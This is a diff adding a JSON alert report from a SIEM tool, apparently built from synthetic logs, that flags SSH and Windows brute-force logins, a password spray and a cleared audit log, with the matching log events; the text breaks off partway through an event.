@@ -1,0 +1,1225 @@
+{
+  "generated": "2026-11-22T19:19:45.372122+00:00",
+  "tool": "siem-tool 0.1.0",
+  "summary": {
+    "critical": 3,
+    "high": 4,
+    "medium": 4,
+    "low": 2,
+    "info": 0
+  },
+  "alerts": [
+    {
+      "rule_id": "success-after-brute-force",
+      "title": "Successful login after repeated failures",
+      "severity": "critical",
+      "description": "A successful logon from a source IP that just produced a burst of failures. This is the moment a brute-force attack may have worked: check the account, what it did next, and whether the source IP is known.",
+      "mitre": [
+        "T1110",
+        "T1078"
+      ],
+      "group": {
+        "src_ip": "203.0.113.50"
+      },
+      "first_seen": "2026-11-20T03:00:05+00:00",
+      "last_seen": "2026-11-20T03:02:31+00:00",
+      "count": 13,
+      "events": [
+        {
+          "timestamp": "2026-11-20T03:00:05+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for deploy from 203.0.113.50 port 40100 ssh2",
+          "raw": "Nov 20 03:00:05 web01 sshd[4300]: Failed password for deploy from 203.0.113.50 port 40100 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": false,
+            "port": 40100,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T03:00:16+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for deploy from 203.0.113.50 port 40101 ssh2",
+          "raw": "Nov 20 03:00:16 web01 sshd[4301]: Failed password for deploy from 203.0.113.50 port 40101 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": false,
+            "port": 40101,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T03:00:27+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for deploy from 203.0.113.50 port 40102 ssh2",
+          "raw": "Nov 20 03:00:27 web01 sshd[4302]: Failed password for deploy from 203.0.113.50 port 40102 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": false,
+            "port": 40102,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T03:00:38+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for deploy from 203.0.113.50 port 40103 ssh2",
+          "raw": "Nov 20 03:00:38 web01 sshd[4303]: Failed password for deploy from 203.0.113.50 port 40103 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": false,
+            "port": 40103,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T03:00:49+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for deploy from 203.0.113.50 port 40104 ssh2",
+          "raw": "Nov 20 03:00:49 web01 sshd[4304]: Failed password for deploy from 203.0.113.50 port 40104 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": false,
+            "port": 40104,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T03:01:00+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for deploy from 203.0.113.50 port 40105 ssh2",
+          "raw": "Nov 20 03:01:00 web01 sshd[4305]: Failed password for deploy from 203.0.113.50 port 40105 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": false,
+            "port": 40105,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T03:01:11+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for deploy from 203.0.113.50 port 40106 ssh2",
+          "raw": "Nov 20 03:01:11 web01 sshd[4306]: Failed password for deploy from 203.0.113.50 port 40106 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": false,
+            "port": 40106,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T03:01:22+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for deploy from 203.0.113.50 port 40107 ssh2",
+          "raw": "Nov 20 03:01:22 web01 sshd[4307]: Failed password for deploy from 203.0.113.50 port 40107 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": false,
+            "port": 40107,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T03:01:33+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for deploy from 203.0.113.50 port 40108 ssh2",
+          "raw": "Nov 20 03:01:33 web01 sshd[4308]: Failed password for deploy from 203.0.113.50 port 40108 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": false,
+            "port": 40108,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T03:01:44+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for deploy from 203.0.113.50 port 40109 ssh2",
+          "raw": "Nov 20 03:01:44 web01 sshd[4309]: Failed password for deploy from 203.0.113.50 port 40109 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": false,
+            "port": 40109,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T03:01:55+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for deploy from 203.0.113.50 port 40110 ssh2",
+          "raw": "Nov 20 03:01:55 web01 sshd[4310]: Failed password for deploy from 203.0.113.50 port 40110 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": false,
+            "port": 40110,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T03:02:06+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for deploy from 203.0.113.50 port 40111 ssh2",
+          "raw": "Nov 20 03:02:06 web01 sshd[4311]: Failed password for deploy from 203.0.113.50 port 40111 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": false,
+            "port": 40111,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T03:02:31+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "success",
+          "event_id": null,
+          "message": "Accepted password for deploy from 203.0.113.50 port 40188 ssh2",
+          "raw": "Nov 20 03:02:31 web01 sshd[4320]: Accepted password for deploy from 203.0.113.50 port 40188 ssh2",
+          "extra": {
+            "method": "password",
+            "port": 40188,
+            "service": "ssh"
+          }
+        }
+      ]
+    },
+    {
+      "rule_id": "success-after-brute-force",
+      "title": "Successful login after repeated failures",
+      "severity": "critical",
+      "description": "A successful logon from a source IP that just produced a burst of failures. This is the moment a brute-force attack may have worked: check the account, what it did next, and whether the source IP is known.",
+      "mitre": [
+        "T1110",
+        "T1078"
+      ],
+      "group": {
+        "src_ip": "203.0.113.77"
+      },
+      "first_seen": "2026-11-20T14:00:00.123456+00:00",
+      "last_seen": "2026-11-20T14:02:10.123456+00:00",
+      "count": 8,
+      "events": [
+        {
+          "timestamp": "2026-11-20T14:00:00.123456+00:00",
+          "source": "windows",
+          "action": "logon",
+          "host": "DC01.corp.example",
+          "user": "Administrator",
+          "src_ip": "203.0.113.77",
+          "outcome": "failure",
+          "event_id": 4625,
+          "message": "Failed logon for Administrator",
+          "raw": "{\"EventID\":4625,\"TimeCreated\":\"2026-11-20T14:00:00.1234567Z\",\"Computer\":\"DC01.corp.example\",\"Channel\":\"Security\",\"TargetUserName\":\"Administrator\",\"TargetDomainName\":\"CORP\",\"IpAddress\":\"203.0.113.77\",\"LogonType\":3,\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"WorkstationName\":\"-\"}",
+          "extra": {
+            "logon_type": 3,
+            "logon_type_name": "network",
+            "domain": "CORP",
+            "workstation": null,
+            "status": "0xc000006d",
+            "sub_status": "0xc000006a"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T14:00:13.123456+00:00",
+          "source": "windows",
+          "action": "logon",
+          "host": "DC01.corp.example",
+          "user": "Administrator",
+          "src_ip": "203.0.113.77",
+          "outcome": "failure",
+          "event_id": 4625,
+          "message": "Failed logon for Administrator",
+          "raw": "{\"EventID\":4625,\"TimeCreated\":\"2026-11-20T14:00:13.1234567Z\",\"Computer\":\"DC01.corp.example\",\"Channel\":\"Security\",\"TargetUserName\":\"Administrator\",\"TargetDomainName\":\"CORP\",\"IpAddress\":\"203.0.113.77\",\"LogonType\":3,\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"WorkstationName\":\"-\"}",
+          "extra": {
+            "logon_type": 3,
+            "logon_type_name": "network",
+            "domain": "CORP",
+            "workstation": null,
+            "status": "0xc000006d",
+            "sub_status": "0xc000006a"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T14:00:26.123456+00:00",
+          "source": "windows",
+          "action": "logon",
+          "host": "DC01.corp.example",
+          "user": "Administrator",
+          "src_ip": "203.0.113.77",
+          "outcome": "failure",
+          "event_id": 4625,
+          "message": "Failed logon for Administrator",
+          "raw": "{\"EventID\":4625,\"TimeCreated\":\"2026-11-20T14:00:26.1234567Z\",\"Computer\":\"DC01.corp.example\",\"Channel\":\"Security\",\"TargetUserName\":\"Administrator\",\"TargetDomainName\":\"CORP\",\"IpAddress\":\"203.0.113.77\",\"LogonType\":3,\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"WorkstationName\":\"-\"}",
+          "extra": {
+            "logon_type": 3,
+            "logon_type_name": "network",
+            "domain": "CORP",
+            "workstation": null,
+            "status": "0xc000006d",
+            "sub_status": "0xc000006a"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T14:00:39.123456+00:00",
+          "source": "windows",
+          "action": "logon",
+          "host": "DC01.corp.example",
+          "user": "Administrator",
+          "src_ip": "203.0.113.77",
+          "outcome": "failure",
+          "event_id": 4625,
+          "message": "Failed logon for Administrator",
+          "raw": "{\"EventID\":4625,\"TimeCreated\":\"2026-11-20T14:00:39.1234567Z\",\"Computer\":\"DC01.corp.example\",\"Channel\":\"Security\",\"TargetUserName\":\"Administrator\",\"TargetDomainName\":\"CORP\",\"IpAddress\":\"203.0.113.77\",\"LogonType\":3,\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"WorkstationName\":\"-\"}",
+          "extra": {
+            "logon_type": 3,
+            "logon_type_name": "network",
+            "domain": "CORP",
+            "workstation": null,
+            "status": "0xc000006d",
+            "sub_status": "0xc000006a"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T14:00:52.123456+00:00",
+          "source": "windows",
+          "action": "logon",
+          "host": "DC01.corp.example",
+          "user": "Administrator",
+          "src_ip": "203.0.113.77",
+          "outcome": "failure",
+          "event_id": 4625,
+          "message": "Failed logon for Administrator",
+          "raw": "{\"EventID\":4625,\"TimeCreated\":\"2026-11-20T14:00:52.1234567Z\",\"Computer\":\"DC01.corp.example\",\"Channel\":\"Security\",\"TargetUserName\":\"Administrator\",\"TargetDomainName\":\"CORP\",\"IpAddress\":\"203.0.113.77\",\"LogonType\":3,\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"WorkstationName\":\"-\"}",
+          "extra": {
+            "logon_type": 3,
+            "logon_type_name": "network",
+            "domain": "CORP",
+            "workstation": null,
+            "status": "0xc000006d",
+            "sub_status": "0xc000006a"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T14:01:05.123456+00:00",
+          "source": "windows",
+          "action": "logon",
+          "host": "DC01.corp.example",
+          "user": "Administrator",
+          "src_ip": "203.0.113.77",
+          "outcome": "failure",
+          "event_id": 4625,
+          "message": "Failed logon for Administrator",
+          "raw": "{\"EventID\":4625,\"TimeCreated\":\"2026-11-20T14:01:05.1234567Z\",\"Computer\":\"DC01.corp.example\",\"Channel\":\"Security\",\"TargetUserName\":\"Administrator\",\"TargetDomainName\":\"CORP\",\"IpAddress\":\"203.0.113.77\",\"LogonType\":3,\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"WorkstationName\":\"-\"}",
+          "extra": {
+            "logon_type": 3,
+            "logon_type_name": "network",
+            "domain": "CORP",
+            "workstation": null,
+            "status": "0xc000006d",
+            "sub_status": "0xc000006a"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T14:01:18.123456+00:00",
+          "source": "windows",
+          "action": "logon",
+          "host": "DC01.corp.example",
+          "user": "Administrator",
+          "src_ip": "203.0.113.77",
+          "outcome": "failure",
+          "event_id": 4625,
+          "message": "Failed logon for Administrator",
+          "raw": "{\"EventID\":4625,\"TimeCreated\":\"2026-11-20T14:01:18.1234567Z\",\"Computer\":\"DC01.corp.example\",\"Channel\":\"Security\",\"TargetUserName\":\"Administrator\",\"TargetDomainName\":\"CORP\",\"IpAddress\":\"203.0.113.77\",\"LogonType\":3,\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"WorkstationName\":\"-\"}",
+          "extra": {
+            "logon_type": 3,
+            "logon_type_name": "network",
+            "domain": "CORP",
+            "workstation": null,
+            "status": "0xc000006d",
+            "sub_status": "0xc000006a"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T14:02:10.123456+00:00",
+          "source": "windows",
+          "action": "logon",
+          "host": "DC01.corp.example",
+          "user": "Administrator",
+          "src_ip": "203.0.113.77",
+          "outcome": "success",
+          "event_id": 4624,
+          "message": "Logon for Administrator",
+          "raw": "{\"EventID\":4624,\"TimeCreated\":\"2026-11-20T14:02:10.1234567Z\",\"Computer\":\"DC01.corp.example\",\"Channel\":\"Security\",\"TargetUserName\":\"Administrator\",\"TargetDomainName\":\"CORP\",\"IpAddress\":\"203.0.113.77\",\"LogonType\":3,\"WorkstationName\":\"-\"}",
+          "extra": {
+            "logon_type": 3,
+            "logon_type_name": "network",
+            "domain": "CORP",
+            "workstation": null
+          }
+        }
+      ]
+    },
+    {
+      "rule_id": "audit-log-cleared",
+      "title": "Windows Security log cleared",
+      "severity": "critical",
+      "description": "Event 1102: the Security audit log was cleared. This is rarely legitimate and is classic anti-forensics. Preserve whatever logs remain (forwarded copies, other hosts) and find out who did it.",
+      "mitre": [
+        "T1070.001"
+      ],
+      "group": {},
+      "first_seen": "2026-11-20T14:20:05.123456+00:00",
+      "last_seen": "2026-11-20T14:20:05.123456+00:00",
+      "count": 1,
+      "events": [
+        {
+          "timestamp": "2026-11-20T14:20:05.123456+00:00",
+          "source": "windows",
+          "action": "log_cleared",
+          "host": "DC01.corp.example",
+          "user": "Administrator",
+          "src_ip": null,
+          "outcome": "success",
+          "event_id": 1102,
+          "message": "Security audit log cleared by Administrator",
+          "raw": "{\"EventID\":1102,\"TimeCreated\":\"2026-11-20T14:20:05.1234567Z\",\"Computer\":\"DC01.corp.example\",\"Channel\":\"Security\",\"SubjectUserName\":\"Administrator\"}",
+          "extra": {}
+        }
+      ]
+    },
+    {
+      "rule_id": "password-spray",
+      "title": "Password spraying (many accounts, one source)",
+      "severity": "high",
+      "description": "One source IP failing logons against many different accounts. Sprayers try one or two common passwords per account to stay under lockout limits, so a per-account brute-force rule misses them.",
+      "mitre": [
+        "T1110.003"
+      ],
+      "group": {
+        "src_ip": "198.51.100.23"
+      },
+      "first_seen": "2026-11-20T02:10:02+00:00",
+      "last_seen": "2026-11-20T02:19:12+00:00",
+      "count": 6,
+      "events": [
+        {
+          "timestamp": "2026-11-20T02:10:02+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "admin",
+          "src_ip": "198.51.100.23",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for invalid user admin from 198.51.100.23 port 51000 ssh2",
+          "raw": "Nov 20 02:10:02 web01 sshd[4100]: Failed password for invalid user admin from 198.51.100.23 port 51000 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": true,
+            "port": 51000,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T02:11:52+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "test",
+          "src_ip": "198.51.100.23",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for invalid user test from 198.51.100.23 port 51001 ssh2",
+          "raw": "Nov 20 02:11:52 web01 sshd[4101]: Failed password for invalid user test from 198.51.100.23 port 51001 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": true,
+            "port": 51001,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T02:13:42+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "oracle",
+          "src_ip": "198.51.100.23",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for invalid user oracle from 198.51.100.23 port 51002 ssh2",
+          "raw": "Nov 20 02:13:42 web01 sshd[4102]: Failed password for invalid user oracle from 198.51.100.23 port 51002 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": true,
+            "port": 51002,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T02:15:32+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "ubuntu",
+          "src_ip": "198.51.100.23",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for invalid user ubuntu from 198.51.100.23 port 51003 ssh2",
+          "raw": "Nov 20 02:15:32 web01 sshd[4103]: Failed password for invalid user ubuntu from 198.51.100.23 port 51003 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": true,
+            "port": 51003,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T02:17:22+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "postgres",
+          "src_ip": "198.51.100.23",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for invalid user postgres from 198.51.100.23 port 51004 ssh2",
+          "raw": "Nov 20 02:17:22 web01 sshd[4104]: Failed password for invalid user postgres from 198.51.100.23 port 51004 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": true,
+            "port": 51004,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T02:19:12+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "guest",
+          "src_ip": "198.51.100.23",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for invalid user guest from 198.51.100.23 port 51005 ssh2",
+          "raw": "Nov 20 02:19:12 web01 sshd[4105]: Failed password for invalid user guest from 198.51.100.23 port 51005 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": true,
+            "port": 51005,
+            "service": "ssh"
+          }
+        }
+      ]
+    },
+    {
+      "rule_id": "brute-force-login",
+      "title": "Brute-force login attempts",
+      "severity": "high",
+      "description": "Many failed logons from one source IP in a short window. Covers SSH (auth.log) and Windows 4625. Tune `threshold` to your environment: a few typos are normal, dozens a minute are not.",
+      "mitre": [
+        "T1110.001"
+      ],
+      "group": {
+        "src_ip": "203.0.113.50"
+      },
+      "first_seen": "2026-11-20T03:00:05+00:00",
+      "last_seen": "2026-11-20T03:02:06+00:00",
+      "count": 12,
+      "events": [
+        {
+          "timestamp": "2026-11-20T03:00:05+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for deploy from 203.0.113.50 port 40100 ssh2",
+          "raw": "Nov 20 03:00:05 web01 sshd[4300]: Failed password for deploy from 203.0.113.50 port 40100 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": false,
+            "port": 40100,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T03:00:16+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for deploy from 203.0.113.50 port 40101 ssh2",
+          "raw": "Nov 20 03:00:16 web01 sshd[4301]: Failed password for deploy from 203.0.113.50 port 40101 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": false,
+            "port": 40101,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T03:00:27+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for deploy from 203.0.113.50 port 40102 ssh2",
+          "raw": "Nov 20 03:00:27 web01 sshd[4302]: Failed password for deploy from 203.0.113.50 port 40102 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": false,
+            "port": 40102,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T03:00:38+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for deploy from 203.0.113.50 port 40103 ssh2",
+          "raw": "Nov 20 03:00:38 web01 sshd[4303]: Failed password for deploy from 203.0.113.50 port 40103 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": false,
+            "port": 40103,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T03:00:49+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for deploy from 203.0.113.50 port 40104 ssh2",
+          "raw": "Nov 20 03:00:49 web01 sshd[4304]: Failed password for deploy from 203.0.113.50 port 40104 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": false,
+            "port": 40104,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T03:01:00+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for deploy from 203.0.113.50 port 40105 ssh2",
+          "raw": "Nov 20 03:01:00 web01 sshd[4305]: Failed password for deploy from 203.0.113.50 port 40105 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": false,
+            "port": 40105,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T03:01:11+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for deploy from 203.0.113.50 port 40106 ssh2",
+          "raw": "Nov 20 03:01:11 web01 sshd[4306]: Failed password for deploy from 203.0.113.50 port 40106 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": false,
+            "port": 40106,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T03:01:22+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for deploy from 203.0.113.50 port 40107 ssh2",
+          "raw": "Nov 20 03:01:22 web01 sshd[4307]: Failed password for deploy from 203.0.113.50 port 40107 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": false,
+            "port": 40107,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T03:01:33+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for deploy from 203.0.113.50 port 40108 ssh2",
+          "raw": "Nov 20 03:01:33 web01 sshd[4308]: Failed password for deploy from 203.0.113.50 port 40108 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": false,
+            "port": 40108,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T03:01:44+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for deploy from 203.0.113.50 port 40109 ssh2",
+          "raw": "Nov 20 03:01:44 web01 sshd[4309]: Failed password for deploy from 203.0.113.50 port 40109 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": false,
+            "port": 40109,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T03:01:55+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for deploy from 203.0.113.50 port 40110 ssh2",
+          "raw": "Nov 20 03:01:55 web01 sshd[4310]: Failed password for deploy from 203.0.113.50 port 40110 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": false,
+            "port": 40110,
+            "service": "ssh"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T03:02:06+00:00",
+          "source": "linux_auth",
+          "action": "logon",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": "203.0.113.50",
+          "outcome": "failure",
+          "event_id": null,
+          "message": "Failed password for deploy from 203.0.113.50 port 40111 ssh2",
+          "raw": "Nov 20 03:02:06 web01 sshd[4311]: Failed password for deploy from 203.0.113.50 port 40111 ssh2",
+          "extra": {
+            "method": "password",
+            "invalid_user": false,
+            "port": 40111,
+            "service": "ssh"
+          }
+        }
+      ]
+    },
+    {
+      "rule_id": "brute-force-login",
+      "title": "Brute-force login attempts",
+      "severity": "high",
+      "description": "Many failed logons from one source IP in a short window. Covers SSH (auth.log) and Windows 4625. Tune `threshold` to your environment: a few typos are normal, dozens a minute are not.",
+      "mitre": [
+        "T1110.001"
+      ],
+      "group": {
+        "src_ip": "203.0.113.77"
+      },
+      "first_seen": "2026-11-20T14:00:00.123456+00:00",
+      "last_seen": "2026-11-20T14:01:18.123456+00:00",
+      "count": 7,
+      "events": [
+        {
+          "timestamp": "2026-11-20T14:00:00.123456+00:00",
+          "source": "windows",
+          "action": "logon",
+          "host": "DC01.corp.example",
+          "user": "Administrator",
+          "src_ip": "203.0.113.77",
+          "outcome": "failure",
+          "event_id": 4625,
+          "message": "Failed logon for Administrator",
+          "raw": "{\"EventID\":4625,\"TimeCreated\":\"2026-11-20T14:00:00.1234567Z\",\"Computer\":\"DC01.corp.example\",\"Channel\":\"Security\",\"TargetUserName\":\"Administrator\",\"TargetDomainName\":\"CORP\",\"IpAddress\":\"203.0.113.77\",\"LogonType\":3,\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"WorkstationName\":\"-\"}",
+          "extra": {
+            "logon_type": 3,
+            "logon_type_name": "network",
+            "domain": "CORP",
+            "workstation": null,
+            "status": "0xc000006d",
+            "sub_status": "0xc000006a"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T14:00:13.123456+00:00",
+          "source": "windows",
+          "action": "logon",
+          "host": "DC01.corp.example",
+          "user": "Administrator",
+          "src_ip": "203.0.113.77",
+          "outcome": "failure",
+          "event_id": 4625,
+          "message": "Failed logon for Administrator",
+          "raw": "{\"EventID\":4625,\"TimeCreated\":\"2026-11-20T14:00:13.1234567Z\",\"Computer\":\"DC01.corp.example\",\"Channel\":\"Security\",\"TargetUserName\":\"Administrator\",\"TargetDomainName\":\"CORP\",\"IpAddress\":\"203.0.113.77\",\"LogonType\":3,\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"WorkstationName\":\"-\"}",
+          "extra": {
+            "logon_type": 3,
+            "logon_type_name": "network",
+            "domain": "CORP",
+            "workstation": null,
+            "status": "0xc000006d",
+            "sub_status": "0xc000006a"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T14:00:26.123456+00:00",
+          "source": "windows",
+          "action": "logon",
+          "host": "DC01.corp.example",
+          "user": "Administrator",
+          "src_ip": "203.0.113.77",
+          "outcome": "failure",
+          "event_id": 4625,
+          "message": "Failed logon for Administrator",
+          "raw": "{\"EventID\":4625,\"TimeCreated\":\"2026-11-20T14:00:26.1234567Z\",\"Computer\":\"DC01.corp.example\",\"Channel\":\"Security\",\"TargetUserName\":\"Administrator\",\"TargetDomainName\":\"CORP\",\"IpAddress\":\"203.0.113.77\",\"LogonType\":3,\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"WorkstationName\":\"-\"}",
+          "extra": {
+            "logon_type": 3,
+            "logon_type_name": "network",
+            "domain": "CORP",
+            "workstation": null,
+            "status": "0xc000006d",
+            "sub_status": "0xc000006a"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T14:00:39.123456+00:00",
